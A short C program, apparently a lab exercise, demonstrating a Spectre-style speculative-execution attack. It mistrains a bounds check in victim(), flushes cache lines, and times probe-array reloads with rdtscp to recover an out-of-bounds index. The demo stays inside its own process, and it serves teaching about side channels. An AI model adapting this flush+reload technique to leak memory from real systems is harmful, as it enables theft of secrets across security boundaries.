#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

// TODO: Define this threshold based on your previous experiments
// Us:we it for determining the secret
#define CACHE_HIT_THRESHOLD 406

typedef struct datablock {
        uint8_t lpad[2048];
        uint8_t dat;
        uint8_t rpad[2047];
} DataBlock;

int size = 10;
DataBlock array[256];

void flushSideChannel() {
        for (int i = 0; i < 256; i++) {
                
                _mm_clflush(&array[i].dat);
        }

}

uint8_t reloadSideChannel() {
         int aux = 0;
        uint64_t timeElapse;
        int best_index = 0;
        uint64_t best_time = UINT64_MAX;

    for (int i = 255; i > -1; i--) {
        volatile uint8_t *add = &array[i].dat;
        
    uint64_t start = __rdtscp(&aux);
    aux = *add; // just to access the value of the data, to measure what is time needed to access it.
    uint64_t end = __rdtscp(&aux);
        timeElapse = end - start;
        if (timeElapse < best_time) {
           best_time = timeElapse;
           best_index = i;
        }
    }

    if (best_time <= CACHE_HIT_THRESHOLD) {
        return (uint8_t)best_index;
    } else {
        return 0xFF;
    }
}



void victim(size_t x) {
        if (x < size) {
                uint8_t temp = array[x].dat;
        }
}

int main() {
         for (int i = 0; i < 256; i++) {
        array[i].dat = 1;
    }
        flushSideChannel();

        // EXHIBIT A.1 BEGIN
        for (int i = 0; i < 10; i++) {
                _mm_clflush(&size);   // EXHIBIT B
                victim(i);            // EXHIBIT D
        }
        // EXHIBIT A.1 END

        _mm_clflush(&size);      // EXHIBIT B
        flushSideChannel();      // EXHIBIT C
        victim(97);              // EXHIBIT A.2
        victim(97);              // EXHIBIT A.2
        victim(97);              // EXHIBIT A.2

        int secret = reloadSideChannel();
        printf("The secret is %d.\n", secret);

        return 0;
}
